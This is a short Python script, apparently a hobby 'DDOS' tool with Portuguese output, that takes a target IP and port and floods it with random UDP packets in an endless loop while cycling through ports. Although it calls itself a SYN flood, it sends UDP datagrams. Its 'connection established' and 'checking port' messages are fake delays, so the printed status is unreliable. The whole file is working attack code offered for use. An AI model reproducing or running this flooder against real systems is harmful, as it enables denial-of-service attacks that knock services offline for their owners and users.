print("\033[92m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Attack DDOS")
print()
print("Laboratorio Luiz - SYN-FLOOD")
print()
ip = input("IP Target : ")
port = int(input("Port       : "))
os.system("clear")
os.system("figlet Attack DDOS")
print("LUIZ")
print("\033[92m")
print("Tentando conectar ao servidor")
time.sleep(5)
print("Checando porta")
time.sleep(5)
print("Testando conexao...")
time.sleep(5)
print("Conexao estabelecida")
time.sleep(5)
print("Ataque Iniciado")
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Enviado %s de pacotes para %s passando pela porta:%s"%(sent, ip, port))
    if port == 65534:
        port = 1

